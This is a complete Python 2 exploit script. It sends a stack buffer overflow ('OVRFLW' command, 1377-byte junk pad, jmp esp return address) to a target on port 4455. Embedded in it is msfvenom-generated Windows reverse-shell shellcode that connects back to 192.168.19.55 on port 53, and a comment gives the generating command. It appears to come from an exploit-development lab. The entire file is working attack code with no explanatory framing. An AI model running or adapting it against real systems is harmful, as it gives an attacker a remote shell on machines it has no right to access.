#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "
EIP = "\x83\x66\x52\x56" #jmp esp
nops="\x90"*200
junk="A"*1377
"""
msfvenom -p msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.55 LPORT=53 -f c -b "\x00\x04\x32\x78\x79\x91\x92\xc1\xc2" -n 50
"""


payload =("\x3f\xfc\x27\x49\xd6\xfc\x99\x99\x37\xfd\x98\x3f\x40\x40\x40"
"\x27\x49\xf5\x37\x99\xd6\x99\xf9\x40\xfd\x4b\x9f\xfc\x4b\x27"
"\x9f\xf8\xf5\x9b\xf8\xf9\x93\x3f\x48\x9b\x40\x27\xfd\x48\x3f"
"\x37\x40\x43\x99\x9b\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff"
"\xc0\x5e\x81\x76\x0e\xbd\xa4\xea\x07\x83\xee\xfc\xe2\xf4\x41"
"\x4c\x68\x07\xbd\xa4\x8a\x8e\x58\x95\x2a\x63\x36\xf4\xda\x8c"
"\xef\xa8\x61\x55\xa9\x2f\x98\x2f\xb2\x13\xa0\x21\x8c\x5b\x46"
"\x3b\xdc\xd8\xe8\x2b\x9d\x65\x25\x0a\xbc\x63\x08\xf5\xef\xf3"
"\x61\x55\xad\x2f\xa0\x3b\x36\xe8\xfb\x7f\x5e\xec\xeb\xd6\xec"
"\x2f\xb3\x27\xbc\x77\x61\x4e\xa5\x47\xd0\x4e\x36\x90\x61\x06"
"\x6b\x95\x15\xab\x7c\x6b\xe7\x06\x7a\x9c\x0a\x72\x4b\xa7\x97"
"\xff\x86\xd9\xce\x72\x59\xfc\x61\x5f\x99\xa5\x39\x61\x36\xa8"
"\xa1\x8c\xe5\xb8\xeb\xd4\x36\xa0\x61\x06\x6d\x2d\xae\x23\x99"
"\xff\xb1\x66\xe4\xfe\xbb\xf8\x5d\xfb\xb5\x5d\x36\xb6\x01\x8a"
"\xe0\xcc\xd9\x35\xbd\xa4\x82\x70\xce\x96\xb5\x53\xd5\xe8\x9d"
"\x21\xba\x5b\x3f\xbf\x2d\xa5\xea\x07\x94\x60\xbe\x57\xd5\x8d"
"\x6a\x6c\xbd\x5b\x3f\x57\xed\xf4\xba\x47\xed\xe4\xba\x6f\x57"
"\xab\x35\xe7\x42\x71\x7d\x6d\xb8\xcc\x2a\xaf\xae\x93\x82\x05"
"\xbd\xa4\xdf\x8e\x5b\xce\xfa\x51\xea\xcc\x73\xa2\xc9\xc5\x15"
"\xd2\x38\x64\x9e\x0b\x42\xea\xe2\x72\x51\xcc\x1a\xb2\x1f\xf2"
"\x15\xd2\xd5\xc7\x87\x63\xbd\x2d\x09\x50\xea\xf3\xdb\xf1\xd7"
"\xb6\xb3\x51\x5f\x59\x8c\xc0\xf9\x80\xd6\x06\xbc\x29\xae\x23"
"\xad\x62\xea\x43\xe9\xf4\xbc\x51\xeb\xe2\xbc\x49\xeb\xf2\xb9"
"\x51\xd5\xdd\x26\x38\x3b\x5b\x3f\x8e\x5d\xea\xbc\x41\x42\x94"
"\x82\x0f\x3a\xb9\x8a\xf8\x68\x1f\x1a\xb2\x1f\xf2\x82\xa1\x28"
"\x19\x77\xf8\x68\x98\xec\x7b\xb7\x24\x11\xe7\xc8\xa1\x51\x40"
"\xae\xd6\x85\x6d\xbd\xf7\x15\xd2")

end = "\r\n"


buffer = cmd +junk + EIP + payload + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
